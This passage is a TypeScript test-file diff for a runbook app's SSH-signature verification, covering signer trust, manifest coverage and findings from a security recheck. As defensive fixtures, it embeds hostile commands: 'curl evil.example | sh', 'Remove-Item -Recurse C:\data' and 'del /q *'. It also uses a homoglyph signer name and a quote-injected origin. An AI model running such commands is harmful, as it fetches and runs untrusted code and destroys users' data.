@@ -7,10 +7,18 @@ import { createHash, generateKeyPairSync, sign as nodeSign } from 'node:crypto';
 import type { KeyObject } from 'node:crypto';
 import { Buffer } from 'buffer';
 import AsyncStorage from '@react-native-async-storage/async-storage';
-import { buildManifest, formatManifest, signedStatus, withSignature } from '@md-runbook/core/signing';
+import { SIGNATURE_NAMESPACE, buildManifest, formatManifest, signedStatus, withSignature } from '@md-runbook/core/signing';
 import {
+  MAX_LIBRARY_CHARS,
   allowUnverified,
+  copyRefusal,
   fetchLibrary,
+  forgetVersions,
+  hasRememberedVersions,
+  highestVersion,
+  loadLibraryMemory,
+  redirectedAway,
+  signedOnlyPolicy,
   libraryKeys,
   libraryLinkUrl,
   libraryState,
@@ -25,22 +33,30 @@ import {
   signatureOf,
   signedFacts,
   withdrawnKeys,
+  libraryHash,
 } from '../runbooks/library';
 import type { Library, LibraryEntry } from '../runbooks/library';
 import { getRunbook, resetRunbooks } from '../runbooks/store';
 import { resetSettings, setLibraryUrl } from '../settings/store';
 import {
+  ADDED_BY_YOU,
+  addSigners,
   coverage,
+  keysFor,
+  loadTrustedSigners,
+  migrateTrustedSigners,
   parseAllowedSigners,
   removeTrustedSigner,
+  reportSigner,
   resetTrustedSigners,
   signatureState,
   trustSigners,
   trustedFor,
   trustedSigners,
+  unsignedRunnable,
 } from '../signing/trust';
+import * as origin from '../runbooks/origin';
 import { CannotCheck, verifySshsig } from '../signing/verify';
-import { textHash } from '../runbooks/origin';
 
 const LIB = 'https://runbooks.example.net/team/';
 /** A device without Web Crypto (an explicit undefined would take the default). */
@@ -192,15 +208,20 @@ function signedWith(
   text: string,
   signer: string,
   sign: (manifest: string) => string,
-  meta: { name?: string; version?: number; expires?: string } = {},
+  meta: { name?: string; version?: number; expires?: string; manifestVersion?: 1 | 2 } = {},
 ): string {
-  const built = buildManifest(text, {
-    name: meta.name ?? 'restart',
-    version: meta.version ?? 1,
-    ...(meta.expires ? { expires: meta.expires } : {}),
-    scopes: [],
-    patterns: {},
-  });
+  const built = buildManifest(
+    text,
+    {
+      name: meta.name ?? 'restart',
+      version: meta.version ?? 1,
+      ...(meta.expires ? { expires: meta.expires } : {}),
+      scopes: [],
+      patterns: {},
+    },
+    // Manifest version 2 (the whole text) unless asked for 1 (the blocks only, as signed before).
+    { version: meta.manifestVersion ?? 2 },
+  );
   if ('errors' in built) throw new Error(built.errors.join('; '));
   const manifest = formatManifest(built.manifest);
   return withSignature(text, { signer, signed: '2026-11-14', manifest, signature: sign(manifest) });
@@ -229,61 +250,65 @@ beforeEach(async () => {
 describe('SSHSIG as OpenSSH checks it', () => {
   it('ECDSA P-256 signatures check out; another message, namespace or a truncated signature does not', async () => {
     const k = ecdsa();
-    expect(await verifySshsig(k.sign('manifest'), 'manifest')).toBe(true);
-    expect(await verifySshsig(k.sign('manifest', { hash: 'sha256' }), 'manifest')).toBe(true);
-    expect(await verifySshsig(k.sign('manifest'), 'manifest!')).toBe(false);
-    expect(await verifySshsig(k.sign('manifest', { namespace: 'git' }), 'manifest')).toBe(false);
+    expect(await verifySshsig(k.sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
+    expect(await verifySshsig(k.sign('manifest', { hash: 'sha256' }), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
+    expect(await verifySshsig(k.sign('manifest'), 'manifest!', SIGNATURE_NAMESPACE)).toBe(false);
+    expect(await verifySshsig(k.sign('manifest', { namespace: 'git' }), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
     // The blob cut short: the inner signature string is no longer whole.
     const blob = Buffer.from(k.sign('manifest'), 'base64');
-    expect(await verifySshsig(blob.subarray(0, blob.length - 5).toString('base64'), 'manifest')).toBe(false);
+    expect(await verifySshsig(blob.subarray(0, blob.length - 5).toString('base64'), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
   });
 
   it('security keys (sk-ecdsa) and passkeys (webauthn): user presence, no attested data, extensions as flagged, no quote in the origin', async () => {
     const k = skEcdsa();
-    expect(await verifySshsig(k.sign('manifest'), 'manifest')).toBe(true);
-    expect(await verifySshsig(k.sign('manifest', 0x00), 'manifest')).toBe(false);
-    expect(await verifySshsig(k.webauthn('manifest'), 'manifest')).toBe(true);
-    expect(await verifySshsig(k.webauthn('manifest'), 'other')).toBe(false);
+    expect(await verifySshsig(k.sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
+    expect(await verifySshsig(k.sign('manifest', 0x00), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
+    expect(await verifySshsig(k.webauthn('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
+    expect(await verifySshsig(k.webauthn('manifest'), 'other', SIGNATURE_NAMESPACE)).toBe(false);
     // Attested credential data (AD) never belongs in an assertion.
-    expect(await verifySshsig(k.webauthn('manifest', { flags: 0x45 }), 'manifest')).toBe(false);
+    expect(await verifySshsig(k.webauthn('manifest', { flags: 0x45 }), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
     // ED set without extensions, and extensions without ED.
-    expect(await verifySshsig(k.webauthn('manifest', { flags: 0x85 }), 'manifest')).toBe(false);
-    expect(await verifySshsig(k.webauthn('manifest', { extensions: Buffer.from([0xa0]) }), 'manifest')).toBe(false);
-    expect(await verifySshsig(k.webauthn('manifest', { flags: 0x85, extensions: Buffer.from([0xa0]) }), 'manifest')).toBe(true);
-    expect(await verifySshsig(k.webauthn('manifest', { origin: 'https://x.example","origin":"https://y' }), 'manifest')).toBe(false);
+    expect(await verifySshsig(k.webauthn('manifest', { flags: 0x85 }), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
+    expect(await verifySshsig(k.webauthn('manifest', { extensions: Buffer.from([0xa0]) }), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
+    expect(
+      await verifySshsig(k.webauthn('manifest', { flags: 0x85, extensions: Buffer.from([0xa0]) }), 'manifest', SIGNATURE_NAMESPACE),
+    ).toBe(true);
+    expect(
+      await verifySshsig(k.webauthn('manifest', { origin: 'https://x.example","origin":"https://y' }), 'manifest', SIGNATURE_NAMESPACE),
+    ).toBe(false);
   });
 
   it('bytes after the last field of the signature are refused; RSA keys under 2048 bits are refused', async () => {
     const k = ed25519();
-    expect(await verifySshsig(k.sign('manifest'), 'manifest')).toBe(true);
-    expect(await verifySshsig(k.sign('manifest', {}, Buffer.from([0])), 'manifest')).toBe(false);
-    expect(await verifySshsig(rsa(2048).sign('manifest'), 'manifest')).toBe(true);
-    expect(await verifySshsig(rsa(1024).sign('manifest'), 'manifest')).toBe(false);
+    expect(await verifySshsig(k.sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
+    expect(await verifySshsig(k.sign('manifest', {}, Buffer.from([0])), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
+    expect(await verifySshsig(rsa(2048).sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
+    expect(await verifySshsig(rsa(1024).sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
   });
 
   it('only a device without Web Crypto (or an algorithm it lacks) is "can\'t check"; anything malformed is false', async () => {
-    await expect(verifySshsig(ed25519().sign('m'), 'm', NO_WEB_CRYPTO)).rejects.toBeInstanceOf(CannotCheck);
+    await expect(verifySshsig(ed25519().sign('m'), 'm', SIGNATURE_NAMESPACE, NO_WEB_CRYPTO)).rejects.toBeInstanceOf(CannotCheck);
     const unsupported = {
       digest: (a: AlgorithmIdentifier, d: BufferSource) => globalThis.crypto.subtle.digest(a, d),
       importKey: async () => {
         throw Object.assign(new Error('Unrecognized algorithm name'), { name: 'NotSupportedError' });
       },
     } as unknown as SubtleCrypto;
-    await expect(verifySshsig(ed25519().sign('m'), 'm', unsupported)).rejects.toBeInstanceOf(CannotCheck);
+    await expect(verifySshsig(ed25519().sign('m'), 'm', SIGNATURE_NAMESPACE, unsupported)).rejects.toBeInstanceOf(CannotCheck);
     const broken = {
       digest: (a: AlgorithmIdentifier, d: BufferSource) => globalThis.crypto.subtle.digest(a, d),
       importKey: async () => {
         throw Object.assign(new Error('bad key data'), { name: 'DataError' });
       },
     } as unknown as SubtleCrypto;
-    expect(await verifySshsig(ed25519().sign('m'), 'm', broken)).toBe(false);
+    expect(await verifySshsig(ed25519().sign('m'), 'm', SIGNATURE_NAMESPACE, broken)).toBe(false);
     // A verify that answers anything but true is not a yes.
     const sloppy = {
       digest: (a: AlgorithmIdentifier, d: BufferSource) => globalThis.crypto.subtle.digest(a, d),
       importKey: async () => ({}),
       verify: async () => 1,
     } as unknown as SubtleCrypto;
-    expect(await verifySshsig(ed25519().sign('m'), 'm', sloppy)).toBe(false);
+    expect(await verifySshsig(ed25519().sign('m'), 'm', SIGNATURE_NAMESPACE, sloppy)).toBe(false);
   });
 
   it('allowed_signers: a line with an option OpenSSH does not know is refused, as there', () => {
@@ -293,6 +318,7 @@ describe('SSHSIG as OpenSSH checks it', () => {
       [`alice@example.net ${key}`, `bob@example.net no-touch-required ${key}`, `carol@example.net VALID-AFTER="20200101" ${key}`].join(
         '\n',
       ),
+      SIGNATURE_NAMESPACE,
     );
     expect(got.signers.map((s) => s.principals[0])).toEqual(['alice@example.net', 'carol@example.net']);
     expect(got.skipped).toBe(1);
@@ -314,7 +340,7 @@ describe('what a library runbook’s signature is worth', () => {
       kind: 'invalid',
     });
     // Under a trusted name and key: a truncated inner signature does not check out.
-    const keys = parseAllowedSigners(linesFor('alice', k)).signers;
+    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
     // A well-formed blob whose Ed25519 signature lost its last byte.
     const truncated = signedWith(RUNBOOK, 'alice', (m) =>
       sshsigBlob(k.pub, Buffer.concat([str('ssh-ed25519'), str(k.raw(m).subarray(0, 63))])),
@@ -330,8 +356,11 @@ describe('what a library runbook’s signature is worth', () => {
     // (The app writes names through signerLabel; a hand-made block can hold anything.)
     const homoglyph = signedWith(RUNBOOK, 'alice', (m) => k.sign(m)).replace('signer=alice', 'signer=\u0430lice');
     expect(homoglyph).toContain('signer=\u0430lice');
-    expect(await signatureState(homoglyph, parseAllowedSigners(`* ssh-ed25519 ${k.pub.toString('base64')}`).signers)).toMatchObject({
-      kind: 'invalid',
+    // Core reads no signature block with such a name since the signature review (SIGNER_NAME_RE): not signed, never verified.
+    expect(
+      await signatureState(homoglyph, parseAllowedSigners(`* ssh-ed25519 ${k.pub.toString('base64')}`, SIGNATURE_NAMESPACE).signers),
+    ).toMatchObject({
+      kind: 'unsigned',
     });
     // No Web Crypto on this device: can't check, not verified.
     expect(
@@ -345,15 +374,15 @@ describe('what a library runbook’s signature is worth', () => {
 
   it('a PowerShell or cmd block added to a signed runbook: partly signed, not verified', async () => {
     const k = ed25519();
-    const keys = parseAllowedSigners(linesFor('alice', k)).signers;
-    const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
+    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
+    const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { manifestVersion: 1 });
     const status = signedStatus(good)!;
-    expect(coverage(good, status)).toBe('partial');
+    expect(coverage(status)).toBe('partial');
     const added = good.replace('# Restart the API\n', '# Restart the API\n\n' + fence('powershell', 'Remove-Item -Recurse C:\\data'));
     const state = await signatureState(added, keys);
     expect(state).toMatchObject({ kind: 'partial', unsigned: 1, verified: [{ name: 'alice' }] });
     const lib = { base: LIB, signedOnly: true };
-    expect(openableReason(lib, { text: added }, state)).toMatch(/1 block that can run uncovered/);
+    expect(openableReason(lib, { text: added, path: 'restart.md' }, state)).toMatch(/1 block that can run uncovered/);
     expect(await signatureState(good.replace('# Restart', fence('cmd', 'del /q *') + '\n# Restart'), keys)).toMatchObject({
       kind: 'partial',
     });
@@ -367,7 +396,7 @@ describe('what a library runbook’s signature is worth', () => {
 
   it('a wildcard principal: verified with the key’s fingerprint, for the names its pattern allows', async () => {
     const k = ed25519();
-    const keys = parseAllowedSigners(`*@corp.example ssh-ed25519 ${k.pub.toString('base64')}`).signers;
+    const keys = parseAllowedSigners(`*@corp.example ssh-ed25519 ${k.pub.toString('base64')}`, SIGNATURE_NAMESPACE).signers;
     const text = signedWith(RUNBOOK, 'security-team@corp.example', (m) => k.sign(m));
     expect(await signatureState(text, keys)).toMatchObject({
       kind: 'verified',
@@ -383,18 +412,24 @@ describe('what a library runbook’s signature is worth', () => {
 
   it('the signed name, version and expiry: another name than the file, an expired manifest, a lower version', async () => {
     const k = ed25519();
-    const keys = parseAllowedSigners(linesFor('alice', k)).signers;
+    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
     const v3 = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'db/drop-staging', version: 3 });
     const s3 = await signatureState(v3, keys);
     expect(signedFacts(LIB, 'restart-web.md', s3)).toEqual({ name: 'db/drop-staging', version: 3, otherName: true });
     expect(signedFacts(LIB, 'db/drop-staging.md', s3)).toEqual({ name: 'db/drop-staging', version: 3, otherName: false });
-    expect(nameFitsPath('ops/restart', 'restart.md')).toBe(true);
+    // The whole signed name is the end of the path (finding B of the recheck).
     expect(nameFitsPath('restart', 'ops/Restart.runbook.md')).toBe(true);
+    expect(nameFitsPath('ops/restart', 'ops/restart.md')).toBe(true);
+    expect(nameFitsPath('ops/restart', 'x/ops/restart.md')).toBe(true);
+    expect(nameFitsPath('ops/restart', 'restart.md')).toBe(false);
+    expect(nameFitsPath('staging/restart', 'prod/restart.md')).toBe(false);
+    expect(nameFitsPath('ops/restart', 'anything/restart.md')).toBe(false);
+    expect(nameFitsPath('restart', 'prerestart.md')).toBe(false);
 
     const expired = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { expires: '2020-01-01' });
     const se = await signatureState(expired, keys);
     expect(se).toMatchObject({ kind: 'expired', manifest: { expires: '2020-01-01' } });
-    expect(openableReason({ base: LIB, signedOnly: true }, { text: expired }, se)).toMatch(/expired on 2020-01-01/);
+    expect(openableReason({ base: LIB, signedOnly: true }, { text: expired, path: 'restart.md' }, se)).toMatch(/expired on 2020-01-01/);
     // The last day still counts (UTC, as the gate compares).
     expect(await signatureState(expired, keys, globalThis.crypto.subtle, Date.UTC(2020, 0, 1, 23))).toMatchObject({ kind: 'verified' });
   });
@@ -475,7 +510,7 @@ describe('what a library runbook’s signature is worth', () => {
     }
     expect(seen).toEqual([undefined]);
     expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified', manifest: { version: 2 } });
-    expect(Object.keys(libraryState().signatures)).toEqual([textHash(next)]);
+    expect(Object.keys(libraryState().signatures)).toEqual([libraryHash(next)]);
   });
 
   it('signedOnly opens verified runbooks only, and stays on when the server stops asking, until the user agrees', async () => {
@@ -503,9 +538,9 @@ describe('what a library runbook’s signature is worth', () => {
 
   it('a copy that exists is checked again when opened under signedOnly', async () => {
     const k = ed25519();
-    const keys = parseAllowedSigners(linesFor('alice', k)).signers;
+    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
     const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
-    const entry: LibraryEntry = { path: 'restart.md', fileName: 'restart.md', folder: '', title: 'r', text: good, hash: textHash(good) };
+    const entry: LibraryEntry = { path: 'restart.md', fileName: 'restart.md', folder: '', title: 'r', text: good, hash: libraryHash(good) };
     const lib: Library = { base: LIB, signedOnly: false, entries: [entry], signers: { list: keys, skipped: 0 } };
     const r = await openLibraryRunbook(lib, entry);
     expect(r.kind).toBe('opened');
@@ -522,7 +557,7 @@ describe('what a library runbook’s signature is worth', () => {
 describe('trusted signers belong to their library', () => {
   it('a key trusted from one library verifies nothing in another; Remove; a key the library no longer publishes', async () => {
     const k = ed25519();
-    const list = parseAllowedSigners(linesFor('alice@corp.example', k)).signers;
+    const list = parseAllowedSigners(linesFor('alice@corp.example', k), SIGNATURE_NAMESPACE).signers;
     const text = signedWith(RUNBOOK, 'alice@corp.example', (m) => k.sign(m));
     trustSigners(list, OTHER);
     expect(trustedSigners()).toHaveLength(1);
@@ -703,5 +738,343 @@ describe('the library address and what the server answers', () => {
     if (got.kind !== 'ok') throw new Error(got.kind);
     expect(got.library.entries[0]).toMatchObject({ path: 'r.md', text, title: 'Restart' });
     expect(got.library.entries[1]).toMatchObject({ path: 'page.md', error: 'HTTP 200' });
+  });
+});
+
+// ---- the one list of trusted signers, coverage, and the recheck of 2026-11-14 ----
+
+describe('one list of trusted signers: where each key counts', () => {
+  it('a library key counts for its library only; a key added by you counts everywhere', async () => {
+    const a = ed25519();
+    const b = ed25519();
+    const textA = signedWith(RUNBOOK, 'alice', (m) => a.sign(m));
+    const textB = signedWith(RUNBOOK, 'bob', (m) => b.sign(m));
+    trustSigners(parseAllowedSigners(linesFor('alice', a), SIGNATURE_NAMESPACE).signers, LIB);
+    expect(addSigners(linesFor('bob', b) + '\n' + 'carol namespaces="git" ' + linesFor('x', a).split(' ').slice(1).join(' '))).toEqual({
+      added: 1,
+      already: 0,
+      skipped: 1,
+    });
+    expect(addSigners(linesFor('bob', b))).toEqual({ added: 0, already: 1, skipped: 0 });
+    expect(trustedSigners().map((s) => [s.principals[0], s.from])).toEqual([
+      ['alice', LIB],
+      ['bob', ADDED_BY_YOU],
+    ]);
+    // keysFor: the library's own and yours; another library's never; a runbook from elsewhere: yours only.
+    expect(keysFor(LIB).map((k) => k.principals[0])).toEqual(['alice', 'bob']);
+    expect(keysFor(OTHER).map((k) => k.principals[0])).toEqual(['bob']);
+    expect(keysFor(undefined).map((k) => k.principals[0])).toEqual(['bob']);
+    // The library's checks: alice in LIB, bob everywhere.
+    expect(await signatureState(textA, libraryKeys({ base: LIB }))).toMatchObject({ kind: 'verified' });
+    expect(await signatureState(textA, libraryKeys({ base: OTHER }))).toMatchObject({ kind: 'unknown' });
+    expect(await signatureState(textB, libraryKeys({ base: OTHER }))).toMatchObject({ kind: 'verified' });
+    // A library that no longer publishes bob doesn't take away a key added by you.
+    expect(libraryKeys({ base: LIB, signers: { list: [], skipped: 0 } }).map((k) => k.principals[0])).toEqual(['bob']);
+    // Trusting a library's lines never makes them "added by you".
+    trustSigners(parseAllowedSigners(linesFor('alice', a), SIGNATURE_NAMESPACE).signers, ADDED_BY_YOU);
+    expect(keysFor(OTHER).map((k) => k.principals[0])).toEqual(['bob']);
+  });
+
+  it('migrates both lists of the builds before, once', async () => {
+    const a = ed25519();
+    const b = ed25519();
+    const old = parseAllowedSigners(linesFor('alice', a), SIGNATURE_NAMESPACE).signers.map((s) => ({ ...s, from: LIB }));
+    await AsyncStorage.setItem('signers.trusted.v1', JSON.stringify(old));
+    await AsyncStorage.setItem(
+      'settings.v1',
+      JSON.stringify({ historySize: 0, trustedSigners: linesFor('bob', b) + '\nbroken line\n' + linesFor('alice', a) }),
+    );
+    await loadTrustedSigners();
+    expect(trustedSigners().map((s) => [s.principals[0], s.from])).toEqual([
+      ['alice', LIB],
+      ['bob', ADDED_BY_YOU],
+      ['alice', ADDED_BY_YOU],
+    ]);
+    expect(await AsyncStorage.getItem('signers.trusted.v1')).toBeNull();
+    expect(JSON.parse((await AsyncStorage.getItem('signers.trusted.v2'))!)).toHaveLength(3);
+    // Once: removing one and starting again doesn't bring it back from the old settings.
+    removeTrustedSigner(trustedSigners()[1]!);
+    await new Promise((r) => setTimeout(r, 0));
+    resetTrustedSigners();
+    await loadTrustedSigners();
+    expect(trustedSigners().map((s) => [s.principals[0], s.from])).toEqual([
+      ['alice', LIB],
+      ['alice', ADDED_BY_YOU],
+    ]);
+    // The old settings' text is still there until the settings are next saved; it is just never read again.
+    expect(await migrateTrustedSigners()).toHaveLength(2);
+  });
+
+  it('a key the library stops publishing is remembered as withdrawn, also while allowed_signers can’t be read (G)', async () => {
+    const k = ed25519();
+    const text = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
+    const files: Record<string, string> = {
+      [LIB + 'index.json']: JSON.stringify(['restart.md']),
+      [LIB + 'restart.md']: text,
+      [LIB + 'allowed_signers']: linesFor('alice', k),
+    };
+    setLibraryUrl(LIB);
+    await refreshLibrary({ fetcher: server(files) });
+    trustSigners(libraryState().library!.signers!.list, LIB);
+    await refreshLibrary({ fetcher: server(files), force: true });
+    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
+    // Withdrawn: allowed_signers lists someone else now.
+    files[LIB + 'allowed_signers'] = linesFor('bob', ed25519());
+    await refreshLibrary({ fetcher: server(files), force: true });
+    expect(trustedFor(LIB)[0]).toMatchObject({ withdrawn: true });
+    // The server fails on allowed_signers: the withdrawn key still doesn't count.
+    const failing = (async (url: string) =>
+      url.endsWith('allowed_signers')
+        ? { ok: false, status: 500, url, headers: new Headers(), text: async () => '' }
+        : server(files)(url)) as unknown as typeof fetch;
+    await refreshLibrary({ fetcher: failing, force: true });
+    expect(libraryState().library!.signers).toBeUndefined();
+    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'unknown' });
+    expect(keysFor(LIB)).toEqual([]);
+    // Published again: it counts again.
+    files[LIB + 'allowed_signers'] = linesFor('alice', k);
+    await refreshLibrary({ fetcher: server(files), force: true });
+    expect(trustedFor(LIB)[0]!.withdrawn).toBeUndefined();
+    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
+  });
+
+  it('a published line’s options are followed: a valid-before= added to retire a key (G)', async () => {
+    const k = ed25519();
+    const text = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
+    trustSigners(parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers, LIB);
+    const retired = parseAllowedSigners(
+      `alice valid-before="20200101" ssh-ed25519 ${k.pub.toString('base64')}`,
+      SIGNATURE_NAMESPACE,
+    ).signers;
+    expect(await signatureState(text, libraryKeys({ base: LIB, signers: { list: retired, skipped: 0 } }))).toMatchObject({
+      kind: 'unknown',
+    });
+    expect(await signatureState(text, libraryKeys({ base: LIB }))).toMatchObject({ kind: 'verified' });
+  });
+});
+
+describe('what a signature covers: coverage()', () => {
+  const PS = fence('powershell', 'Restart-Service api');
+
+  it('manifest version 2, text as signed: the whole runbook, PowerShell included, not partly signed', async () => {
+    const k = ed25519();
+    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
+    const text = signedWith(RUNBOOK + '\n' + PS, 'alice', (m) => k.sign(m), { manifestVersion: 2 });
+    const status = signedStatus(text)!;
+    expect(status.version).toBe(2);
+    expect(coverage(status)).toBe('whole');
+    expect(unsignedRunnable(text, status)).toBe(0);
+    expect(await signatureState(text, keys)).toMatchObject({ kind: 'verified', coverage: 'whole' });
+    expect(openableReason({ base: LIB, signedOnly: true }, { text, path: 'restart.md' }, await signatureState(text, keys))).toBeUndefined();
+    expect(await reportSigner(text, keys)).toBe('alice');
+  });
+
+  it('manifest version 2 whose text changed: changed, never partly signed', async () => {
+    const k = ed25519();
+    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
+    const text = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { manifestVersion: 2 });
+    for (const changed of [
+      text.replace('# Restart the API', '# Restart the API now'),
+      text.replace('# Restart the API\n', '# Restart the API\n\n' + PS),
+    ]) {
+      const status = signedStatus(changed)!;
+      expect(status.textChanged).toBe(true);
+      expect(coverage(status)).toBe('changed');
+      expect(unsignedRunnable(changed, status)).toBe(0);
+      expect(await signatureState(changed, keys)).toMatchObject({ kind: 'changed', signers: ['alice'] });
+      expect(await reportSigner(changed, keys)).toBeUndefined();
+    }
+  });
+
+  it('manifest version 1: only these steps; a PowerShell block outside makes it partly signed', async () => {
+    const k = ed25519();
+    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
+    const v1 = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { manifestVersion: 1 });
+    expect(coverage(signedStatus(v1)!)).toBe('partial');
+    // Prose changed: a version 1 signature never covered it, still these steps verified.
+    expect(await signatureState(v1.replace('# Restart the API', '# Restart it'), keys)).toMatchObject({
+      kind: 'verified',
+      coverage: 'partial',
+    });
+    // Not enough for report-runs-required: the front matter isn't signed.
+    expect(await reportSigner(v1, keys)).toBeUndefined();
+    const withPs = signedWith(RUNBOOK + '\n' + PS, 'alice', (m) => k.sign(m), { manifestVersion: 1 });
+    expect(await signatureState(withPs, keys)).toMatchObject({ kind: 'partial', unsigned: 1 });
+  });
+});
+
+describe('the recheck of 2026-11-14', () => {
+  it('A: states are keyed by SHA-256 of the text: two texts sharing a short hash never share a state', async () => {
+    const k = ed25519();
+    const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
+    const evil = RUNBOOK.replace('systemctl restart api', 'curl evil.example | sh');
+    // Even if textHash (cyrb53) gave both texts the same value, nothing in the library uses it.
+    const spy = jest.spyOn(origin, 'textHash').mockReturnValue('same-53-bit-hash');
+    try {
+      const files: Record<string, string> = {
+        [LIB + 'index.json']: JSON.stringify(['a.md', 'b.md']),
+        [LIB + 'a.md']: good,
+        [LIB + 'b.md']: evil,
+        [LIB + 'allowed_signers']: linesFor('alice', k),
+      };
+      setLibraryUrl(LIB);
+      await refreshLibrary({ fetcher: server(files) });
+      trustSigners(libraryState().library!.signers!.list, LIB);
+      await refreshLibrary({ fetcher: server(files), force: true });
+      const [a, b] = libraryState().library!.entries;
+      expect(a!.hash).toBe(createHash('sha256').update(good).digest('hex'));
+      expect(b!.hash).toBe(createHash('sha256').update(evil).digest('hex'));
+      expect(signatureOf(libraryState(), a!)).toMatchObject({ kind: 'verified' });
+      expect(signatureOf(libraryState(), b!)).toEqual({ kind: 'unsigned' });
+    } finally {
+      spy.mockRestore();
+    }
+  });
+
+  it('B: under signedOnly, a runbook signed under another file’s name is refused', async () => {
+    const k = ed25519();
+    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
+    const drop = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'db/drop-staging' });
+    const s = await signatureState(drop, keys);
+    expect(s).toMatchObject({ kind: 'verified' });
+    const lib = { base: LIB, signedOnly: true };
+    expect(openableReason(lib, { text: drop, path: 'restart-web.md' }, s)).toMatch(
+      /signed as db\/drop-staging, which is not the name of restart-web\.md/,
+    );
+    expect(openableReason(lib, { text: drop, path: 'db/drop-staging.md' }, s)).toBeUndefined();
+    // Swapped folders: staging/restart signed, served as prod/restart.md.
+    const staging = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'staging/restart' });
+    expect(openableReason(lib, { text: staging, path: 'prod/restart.md' }, await signatureState(staging, keys))).toMatch(/not the name/);
+    // Not signedOnly: it opens, with the amber flag (signedFacts.otherName).
+    expect(openableReason({ base: LIB, signedOnly: false }, { text: drop, path: 'restart-web.md' }, s)).toBeUndefined();
+    expect(signedFacts(LIB, 'restart-web.md', s)).toMatchObject({ otherName: true });
+  });
+
+  it('C: the version floor is per path and name; Forget the versions seen resets a library', async () => {
+    const k = ed25519();
+    const files: Record<string, string> = {
+      [LIB + 'index.json']: JSON.stringify({ signedOnly: true, runbooks: ['db/restore.md', 'web/restore.md'] }),
+      [LIB + 'db/restore.md']: signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'restore', version: 5 }),
+      [LIB + 'web/restore.md']: signedWith(RUNBOOK + '\nweb\n', 'alice', (m) => k.sign(m), { name: 'restore', version: 2 }),
+      [LIB + 'allowed_signers']: linesFor('alice', k),
+    };
+    setLibraryUrl(LIB);
+    await refreshLibrary({ fetcher: server(files) });
+    trustSigners(libraryState().library!.signers!.list, LIB);
+    await refreshLibrary({ fetcher: server(files), force: true });
+    const lib = libraryState().library!;
+    expect(highestVersion(LIB, 'db/restore.md', 'restore')).toBe(5);
+    expect(highestVersion(LIB, 'web/restore.md', 'restore')).toBe(2);
+    for (const e of lib.entries) expect(openableReason(lib, e, signatureOf(libraryState(), e))).toBeUndefined();
+    // A version signed too high by mistake holds back the ones after, until forgotten.
+    files[LIB + 'db/restore.md'] = signedWith(RUNBOOK + '\nfixed\n', 'alice', (m) => k.sign(m), { name: 'restore', version: 3 });
+    await refreshLibrary({ fetcher: server(files), force: true });
+    const db = libraryState().library!.entries[0]!;
+    expect(openableReason(libraryState().library!, db, signatureOf(libraryState(), db))).toMatch(/older than version 5/);
+    expect(hasRememberedVersions(LIB)).toBe(true);
+    forgetVersions(LIB);
+    expect(hasRememberedVersions(LIB)).toBe(false);
+    expect(openableReason(libraryState().library!, db, signatureOf(libraryState(), db))).toBeUndefined();
+  });
+
+  it('D: a copy of a signedOnly library is refused wherever it is opened, by the remembered policy too', async () => {
+    const k = ed25519();
+    const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
+    const files: Record<string, string> = {
+      [LIB + 'index.json']: JSON.stringify({ runbooks: ['restart.md'] }),
+      [LIB + 'restart.md']: good,
+    };
+    setLibraryUrl(LIB);
+    await refreshLibrary({ fetcher: server(files) });
+    const opened = await openLibraryRunbook(libraryState().library!, libraryState().library!.entries[0]!);
+    if (opened.kind !== 'opened') throw new Error(opened.message);
+    // The library turns signedOnly on (nobody trusted): the policy is remembered.
+    files[LIB + 'index.json'] = JSON.stringify({ signedOnly: true, runbooks: ['restart.md'] });
+    await refreshLibrary({ fetcher: server(files), force: true });
+    expect(signedOnlyPolicy(LIB)).toBe(true);
+    const state = await signatureState(good, libraryKeys({ base: LIB }));
+    const copy = getRunbook(opened.runbook.id)!;
+    expect(copyRefusal(copy, { base: LIB, path: 'restart.md', state, facts: undefined, signedOnly: true })).toMatch(
+      /trust its signers first/,
+    );
+    // A start without the library read (offline): the remembered policy still holds.
+    resetLibrary();
